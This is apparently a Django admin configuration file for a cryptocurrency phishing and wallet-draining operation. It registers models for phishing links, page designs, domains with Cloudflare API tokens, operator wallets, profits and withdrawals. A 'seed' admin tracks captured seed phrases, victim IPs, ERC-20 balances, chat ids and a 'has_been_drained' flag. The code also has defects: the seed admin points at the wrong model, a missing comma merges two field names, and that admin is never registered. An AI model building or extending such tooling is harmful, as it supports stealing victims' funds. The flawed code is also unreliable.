from django.contrib import admin
from django.contrib.auth.admin import UserAdmin as UserAdminModel
from django.utils.html import mark_safe

from .models import Wallet, User, Domain, Cloudflare, Link, Design, Withdraw, Profit, seed

# Register your models here.
class LinkAdmin(admin.ModelAdmin):
    model = Link
    list_display = ['id', 'user', 'domain', 'path', 'design', 'created_at',]
    list_editable = ['domain', 'path', 'design', 'created_at',]


class WalletAdmin(admin.ModelAdmin):
    model = Wallet
    list_display = ['id', 'user', 'btc', 'eth', 'xmr', 'btcBalance', 'ethBalance', 'xmrBalance']
    list_editable = ['btc', 'eth', 'xmr', 'btcBalance', 'ethBalance', 'xmrBalance']


class ProfitAdmin(admin.ModelAdmin):
    model = Profit
    list_display = ['id', 'user', 'sum', 'coin', 'created_at']
    list_editable = ['sum', 'coin']


class DomainAdmin(admin.ModelAdmin):
    model = Domain
    list_display = ['id', 'user', 'name', 'ns1', 'ns2', 'cloudId', 'cloud', 'status', 'created_at']
    list_editable = ['name', 'ns1', 'ns2', 'cloudId', 'cloud', 'status']


class CloudflareAdmin(admin.ModelAdmin):
    model = Cloudflare
    list_display = ['id', 'email', 'token', 'used', 'cloud_id', 'created_at']
    list_editable = ['email', 'token', 'used', 'cloud_id']


class seedAdmin(admin.ModelAdmin):
    model = Cloudflare
    list_display = ['id', 'user', 'ip', 'link', 'url_from', 'seed', 'erc20_token', 'erc20_sum' 'screen_chatid', 'action_chatid', 'owner_wallet', 'has_been_drained']
    list_editable = ['has_been_drained']


class DesignAdmin(admin.ModelAdmin):
    model = Design
    list_display = ['id', 'name', 'preview', 'type', 'created_at',]
    list_editable = ['name', 'type']
    def preview(self, obj):
        return mark_safe(f'<img src="/{obj.img}" width="50%" height="50%" />')
        

class WithdrawAdmin(admin.ModelAdmin):
    model = Withdraw
    list_display = ['id', 'user', 'status', 'sum', 'coin', 'created_at']
    list_editable = ['status', 'sum', 'coin']


class UserAdmin(UserAdminModel):
    model = User
    list_display = ['id', 'username',  'role', 'created_at', 'is_staff', 'is_active', 'is_superuser'] 
    list_editable = ['username',  'role', 'created_at', 'is_staff', 'is_active', 'is_superuser'] 
    list_filter = ('username', 'is_staff', 'is_active',)
    fieldsets = (
        (None, {'fields': ('username', 'password')}),
        ('Permissions', {'fields': ('is_staff', 'is_active', 'is_superuser', 'role',)}),
    )
    add_fieldsets = (
        (None, {
            'classes': ('wide',),
            'fields': ('username', 'password1', 'password2', 'is_staff', 'is_active', 'is_superuser',  'role',)}
        ),
    )
    search_fields = ('username',)
    ordering = ('id',)





admin.site.register(User, UserAdmin)
admin.site.register(Wallet, WalletAdmin)
admin.site.register(Domain, DomainAdmin)
admin.site.register(Cloudflare, CloudflareAdmin)
admin.site.register(Link, LinkAdmin)
admin.site.register(Design, DesignAdmin)
admin.site.register(Withdraw, WithdrawAdmin)
admin.site.register(Profit, ProfitAdmin)

